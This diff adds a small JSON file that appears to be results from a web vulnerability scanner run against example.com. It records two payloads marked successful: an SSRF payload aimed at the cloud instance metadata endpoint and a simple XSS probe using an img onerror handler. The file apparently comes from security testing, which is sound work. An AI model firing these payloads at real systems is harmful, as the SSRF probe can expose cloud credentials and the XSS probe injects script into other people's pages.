@@ -1,0 +1,20 @@
+{
+  "target": "https://example.com",
+  "timestamp": "2025-05-15 18:17:07",
+  "results": [
+    {
+      "payload": "http://169.254.169.254/latest/meta-data/",
+      "success": true,
+      "signature": {
+        "vector": "SSRF"
+      }
+    },
+    {
+      "payload": "'><img src=x onerror=alert(1)>",
+      "success": true,
+      "signature": {
+        "vector": "XSS"
+      }
+    }
+  ]
+}
